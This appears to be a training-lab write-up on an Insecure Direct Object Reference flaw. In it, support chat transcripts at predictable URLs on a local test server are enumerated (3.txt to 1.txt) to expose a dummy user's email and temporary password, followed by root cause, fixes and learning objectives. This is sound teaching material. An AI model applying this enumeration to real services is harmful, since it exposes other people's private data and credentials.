# IDOR Lab — Exposed Chat Transcripts

## Lab Overview

This lab demonstrates an **Insecure Direct Object Reference (IDOR)** vulnerability where support chat transcripts are stored as publicly accessible files with predictable names.

Attackers can enumerate transcript filenames and access sensitive information belonging to other users.

---

## Vulnerability Type

Insecure Direct Object Reference (IDOR)

OWASP Category:

A01:2021 — Broken Access Control

---

## Scenario

Support chat transcripts are accessible through URLs:

```text
/api/idor/chat/3.txt
```

The application does not verify whether a user is authorized to access a specific transcript.

---

## Vulnerable Endpoint

GET

```text
/api/idor/chat/{filename}
```

Example:

```text
/api/idor/chat/3.txt
```

---

## Exploitation Steps

### Initial Transcript

User opens:

```text
http://localhost:5000/api/idor/chat/3.txt
```

Content:

```text
Customer:
How do I update profile photo?

Support:
Go to account settings.
```

No sensitive data found.

---

### Enumeration

Attacker changes:

```text
3.txt
```

to:

```text
1.txt
```

Request:

```text
http://localhost:5000/api/idor/chat/1.txt
```

---

### Exposed Transcript

Response:

```text
Customer: Hi support

Support: Hello John, how can I help?

Customer:
I forgot my login password again.

Support:

Email: john@test.com
Temporary password: john@123

Please reset after login.
```

---

## Impact

Attacker gains:

```text
Email:
john@test.com

Password:
john@123
```

Possible consequences:

✔ Unauthorized account access  
✔ Credential theft  
✔ Privacy violations  
✔ Account takeover  

---

## Complete Attack Chain

```text
Open transcript
↓

Notice predictable filenames
↓

Enumerate:
3.txt → 2.txt → 1.txt

↓

Discover credentials

↓

Login as another user

↓

Account compromise
```

---

## Root Cause

Application exposes sensitive resources using predictable identifiers:

Example:

```text
/chat/1.txt
/chat/2.txt
/chat/3.txt
```

without verifying ownership.

Missing:

```text
Authorization checks
Access control validation
```

---

## Secure Fix

Avoid:

```text
Public transcript filenames
Sequential IDs
```

Use:

### Authorization checks

Verify:

```text
Current user owns resource
```

before serving content.

---

### Random identifiers

Instead of:

```text
/chat/1.txt
```

Use:

```text
/chat/9af82c71.txt
```

---

### Store sensitive data securely

Never expose:

```text
Passwords
Temporary credentials
Internal notes
```

inside downloadable files.

---

## Learning Objectives

After completing this lab learners should understand:

- IDOR vulnerabilities
- Resource enumeration
- Broken access control
- Sensitive data exposure
- Credential theft
- Secure authorization design

---

## Lab Information

Lab:

IDOR — Exposed Chat Logs

Difficulty:

Easy

Category:

Broken Access Control

Status:

✔ Completed